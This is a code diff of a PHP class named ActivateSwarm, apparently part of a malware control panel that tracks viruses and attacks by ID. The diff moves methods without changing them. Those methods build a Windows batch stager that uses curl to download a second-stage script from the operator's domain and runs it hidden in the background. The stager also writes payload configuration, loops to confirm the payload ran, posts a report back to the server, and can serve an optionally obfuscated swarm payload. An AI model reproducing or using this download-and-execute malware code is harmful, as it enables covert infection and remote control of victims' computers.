@@ -61,6 +61,34 @@ class ActivateSwarm extends AttackBase {
         $this->checkHash = $checkHash;
     }
 
+    public function generateBatchCode(): string {
+        ob_start(); //@formatter:off ?>
+        chCp 65001
+        >"<?php echo $this->initialLocation; ?>\mn.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/extras/mn\n"; ?>
+        >"<?php echo $this->initialLocation; ?>\ic" (
+            echo type^|0
+            echo libs^|<?php echo $this->libsLocation . "\n"; ?>
+            echo base^|<?php echo $this->baseLocation . "\n"; ?>
+        )
+        start /b cmd.exe /c "<?php echo $this->initialLocation; ?>\mn.cmd"
+        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
+        //echo BaseScriptWin::cleanUpPayload();
+        return ob_get_clean(); //@formatter:on
+    }
+
+    private function generateUploadCode() {
+        ob_start(); ?>
+        curl -d "" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
+        <?php return ob_get_clean();
+    }
+
+    public function processExtras(string $resourceIdentifier): void {
+        if ($resourceIdentifier == "mn") {
+            //echo BaseScriptWin::obfuscate(BaseScriptWin::complexMain($this->newVirusId, $this->swarmClockSpeed, $this->checkHash));
+            echo BaseScriptWin::complexMain($this->newVirusId, $this->swarmClockSpeed, $this->checkHash);
+        }
+    }
+
     protected function setState(string $json): void {
         $state = json_decode($json, true);
         $this->baseLocation = $state["baseLocation"];
@@ -84,33 +112,5 @@ class ActivateSwarm extends AttackBase {
         $state["checkHash"] = $this->checkHash;
         $state["newVirusId"] = $this->newVirusId;
         return json_encode($state);
-    }
-
-    private function generateUploadCode() {
-        ob_start(); ?>
-        curl -d "" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
-        <?php return ob_get_clean();
-    }
-
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off ?>
-        chCp 65001
-        >"<?php echo $this->initialLocation; ?>\mn.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/extras/mn\n"; ?>
-        >"<?php echo $this->initialLocation; ?>\ic" (
-            echo type^|0
-            echo libs^|<?php echo $this->libsLocation . "\n"; ?>
-            echo base^|<?php echo $this->baseLocation . "\n"; ?>
-        )
-        start /b cmd.exe /c "<?php echo $this->initialLocation; ?>\mn.cmd"
-        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
-        //echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean(); //@formatter:on
-    }
-
-    public function processExtras(string $resourceIdentifier): void {
-        if ($resourceIdentifier == "mn") {
-            //echo BaseScriptWin::obfuscate(BaseScriptWin::complexMain($this->newVirusId, $this->swarmClockSpeed, $this->checkHash));
-            echo BaseScriptWin::complexMain($this->newVirusId, $this->swarmClockSpeed, $this->checkHash);
-        }
     }
 }
